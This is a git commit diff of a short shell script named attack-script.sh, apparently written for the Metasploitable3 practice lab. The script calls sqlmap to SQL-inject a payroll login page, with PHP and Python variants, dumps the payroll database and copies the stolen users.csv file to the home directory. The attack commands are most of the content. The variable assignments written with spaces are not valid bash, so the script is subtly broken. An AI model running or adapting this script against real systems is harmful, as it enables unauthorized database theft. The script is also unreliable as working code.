c2a33742f9d65da2b709287475f4f2720159dcd6
vagrant <vagrant@metasploitable3-ub1404>
2020-04-07 01:29:39 +0000

    updated attack-script

--- attack-script.sh
+++ attack-script.sh
@@ -1,13 +1,14 @@
 TARGET = $1
 DATABASE = $2
+SERVER = $3
 
-if [ $DATABASE == "mysql" ]
+if [ $SERVER == "php" ]
 then 
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=mysql --dump 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
-elif [ $DATABASE == "postgresql" ]
+elif [ $SERVER == "python" ]
 then
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/  
 else
 	echo "Not valid."
